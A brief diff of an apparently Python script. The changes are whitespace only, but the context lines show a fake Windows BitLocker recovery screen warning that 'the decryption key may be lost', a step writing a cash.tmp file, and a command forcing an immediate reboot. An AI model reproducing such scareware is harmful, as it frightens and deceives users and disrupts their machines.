@@ -35,7 +35,7 @@ has changed. This may have happened because disc or USB device was inserted.
 Removing it and restarting your PC may fix this problem.
 
 Here's how to find your key:
- - Try your Microsoft account a: aka.ms/myrecoverykey
+- Try your Microsoft account a: aka.ms/myrecoverykey
 - For more information go to: aka.ms/recoverykeyfaq
 - Warning: Do not turn off the computer. The decryption key may be lost."""
     m4 = """Press Enter to continue
@@ -151,4 +151,5 @@ try:
 except Exception as e:
     print(f"cash.tmp 생성 실패: {e}")
 os.system("shutdown /r /t 0")
+
  
